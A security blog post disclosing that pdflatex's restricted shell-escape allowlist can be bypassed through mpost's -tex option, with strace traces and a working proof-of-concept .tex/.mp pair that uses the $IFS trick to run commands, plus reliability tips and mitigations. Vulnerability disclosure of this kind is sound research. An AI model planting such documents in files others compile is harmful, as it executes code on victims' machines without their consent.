---
layout: post
title: Pwning coworkers thanks to LaTeX
---

Writing reports in LaTeX is painful. However, it's a great occasion to bring joy
to the office and pwn a coworker's laptop while he's kindly proofreading your
pentest report.

<!-- more -->



# \input and \write18 primitives

A few techniques allow the
[execution of commands](https://tex.stackexchange.com/questions/20444/what-are-immediate-write18-and-how-does-one-use-them)
during the conversion of a `.tex` file to a PDF with `pdflatex`. It's
documented, and the following TeX primitives send commands to the shell:

~~~~~ tex
\immediate\write18{bibtex8 --wolfgang \jobname}
\input{|bibtex8 --wolfgang \jobname}
~~~~~

On Ubuntu 16.04, `/usr/share/texmf/web2c/texmf.cnf` configuration file controls
the behavior of `pdflatex` (`texlive-base` package). Here's an extract:

~~~~~ tex
% Enable system commands via \write18{...}.  When enabled fully (set to
% t), obviously insecure.  When enabled partially (set to p), only the
% commands listed in shell_escape_commands are allowed.  Although this
% is not fully secure either, it is much better, and so useful that we
% enable it for everything but bare tex.
shell_escape = p

% No spaces in this command list.
%
% The programs listed here are as safe as any we know: they either do
% not write any output files, respect openout_any, or have hard-coded
% restrictions similar or higher to openout_any=p.  They also have no
% features to invoke arbitrary other programs, and no known exploitable
% bugs.  All to the best of our knowledge.  They also have practical use
% for being called from TeX.
%
shell_escape_commands = \
bibtex,bibtex8,\
extractbb,\
kpsewhich,\
makeindex,\
mpost,\
repstopdf,\

~~~~~

Normally, any program listed in `shell_escape_commands` should be allowed to be
executed. Let's verify this. First, create a minimal `.tex` file:

~~~~~ bash
$ cat <<EOF>x.tex
\documentclass{article}
\begin{document}
\immediate\write18{uname -a}
\end{document}
EOF
~~~~~

Then verify if `uname` is actually called thanks to `strace`:

~~~~~ bash
$ strace -ff -e execve pdflatex x.tex >/dev/null
execve("/usr/bin/pdflatex", ["pdflatex", "x.tex"], [/* 32 vars */]) = 0
+++ exited with 0 +++
~~~~~

As expected, `uname -a` wasn't executed. Let's replace `uname` with `kpsewhich`,
which should be allowed:

~~~~~ bash
$ sed -i 's/uname -a/kpsewhich --imminent --pwn/' x.tex
$ strace -ff -e execve pdflatex x.tex |& grep execve
execve("/usr/bin/pdflatex", ["pdflatex", "x.tex"], [/* 32 vars */]) = 0
[pid 14042] execve("/bin/sh", ["sh", "-c", "kpsewhich '--imminent' '--pwn'"], [/* 37 vars */]) = 0
[pid 14043] execve("/usr/bin/kpsewhich", ["kpsewhich", "--imminent", "--pwn"], [/* 37 vars */]) = 0
~~~~~

Alright, `kpsewhich` is really executed, as should any binary in the
`shell_escape_commands` list. According to `texmf.cnf`, the programs in this
list **have no features to invoke arbitrary other programs**. As we're going to
see, this assertion is utterly wrong. Let's check if the binaries (``bibtex``,
``bibtex8``, ``extractbb``, ``kpsewhich``, ``makeindex``, ``mpost``,
``repstopdf``) handle malicious input correctly.



# MetaPost

The `mpost` command seems particularly interesting because of the `-tex` option
(which isn't documented in the
[mpost manpage](https://linux.die.net/man/1/mpost) but in the `--help` option):

~~~~~ man
-tex=TEXPROGRAM           use TEXPROGRAM for text labels
~~~~~

Let's create a minimal MetaPost file, and try a few combination of arguments
(I've absolutely no idea of what this command is meant to do, and the [source
code](https://github.com/pgundlach/LuaTeX/blob/master/source/texk/web2c/mplibdir/mpost.w)
isn't of great help):

~~~~~ bash
$ cat <<EOF>x.mp
verbatimtex
\documentclass{minimal}
\begin{document}
etex
beginfig (1)
label(btex blah etex, origin);
endfig;
\end{document}
bye
EOF

$ echo x.mp \
  |  strace -ff -e execve mpost -ini -tex="/bin/uname -a" \
  |& grep execve
execve("/usr/bin/mpost", ["mpost", "-ini", "-tex=/bin/uname -a"], [/* 32 vars */]) = 0
[pid 25508] execve("/bin/uname", ["/bin/uname", "-a", "mpj9sP7Z.tex"], [/* 37 vars */]) = 0
~~~~~

Great, `uname -a` is executed.



# Exploitation

As seen above, the execution of arbitrary commands is straightforward. Passing
arbitrary arguments to the command line is a little bit more difficult. I didn't
manage to put any space in them because of the way arguments are parsed. The
function responsible of the command execution is `runpopen()`
([texmfmp.c](http://www.luatex.org/svn/branches/direct_node/source/texk/web2c/lib/texmfmp.c)).
It calls `shell_cmd_is_allowed()` which tells if the given command is allowed
(according to `shell_escape_commands` from the configuration file) and quotes
arguments properly. Single quotes (`'`) aren't allowed. Nevermind, powerful
payloads can be written as Python one-liner without requiring any space; but it
may be easier to execute shell commands directly thanks to the bash `$IFS`
trick.

Finally, here's a PoC of the vulnerability which executes
`bash -c '(id;uname${IFS}-sm)>/tmp/pwn'`:

~~~~~ bash
$ cat <<EOF>x.mp
verbatimtex
\documentclass{minimal}\begin{document}
etex beginfig (1) label(btex blah etex, origin);
endfig; \end{document} bye
EOF

$ cat <<EOF>x.tex
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}
EOF

$ cat /tmp/pwn
cat: /tmp/pwn: No such file or directory

$ pdflatex x.tex >/dev/null
fatal: DVI generation failed

$ cat /tmp/pwn
uid=1000(user) gid=1000(user)
Linux x86_64
~~~~~

A few tricks can improve the "exploit" reliability. Indeed, this PoC doesn't
work if `pdflatex` isn't lauched from `x.mp`'s directory (but default `.mp`
files can be specified). The `-interaction=nonstopmode` option of `mpost `allows
the compilation of the rest of the document even if an error occurs.



# Conclusion

I think there are plenty of other ways to get code execution, not only by
managing to execute arbitrary command but also by overwriting arbitrary files.
The `-no-shell-escape` option of `pdflatex` is a workaround which might save you
from this specific issue but I wouldn't rely too much on it. Given that
`pdflatex` and related tools are mostly written in old school `C`, memory
corruption bugs are likely to be present…

In short, run `pdflatex` in a VM.
